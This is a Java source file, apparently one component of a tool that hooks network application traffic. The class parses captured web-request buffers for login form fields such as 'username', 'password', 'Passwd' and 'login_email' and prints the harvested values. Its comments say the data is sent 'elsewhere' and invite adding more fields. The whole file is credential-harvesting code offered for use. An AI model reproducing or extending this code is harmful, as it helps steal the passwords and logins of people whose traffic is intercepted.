package com.schmidt73.networkapplicationhook.threads;

import java.util.Iterator;
import java.util.Map;

import com.schmidt73.networkapplicationhook.parser.ParseRequest;

/**
 * Thread parses the buffer and does sends the data elsewhere.
 * 
 * @author schmidt73
 * 
 */

public class ParseWebRequestThread implements Runnable {
	/**
	 * These are the forms that we will look for. Feel free to add more
	 */
	private static String[] forms = { "username", "password", "user", "login",
			"pass", "Login", "login_email", "login_password", "userid",
			"Passwd", "Email" };

	private ParseRequest request;
	private String buffer;

	public ParseWebRequestThread(String buffer) {
		request = new ParseRequest(forms);
		this.buffer = buffer;
	}

	/*
	 * Just parses the buffer and prints it. Will do more with it eventually.
	 */

	public void run() {
		Map<String, String> formValuePairs = request.parseWebRequest(buffer);

		for (Iterator<String> iterator = formValuePairs.keySet().iterator(); iterator
				.hasNext();) {
			String key = (String) iterator.next();
			System.out.println(formValuePairs.get(key));
		}
	}
}
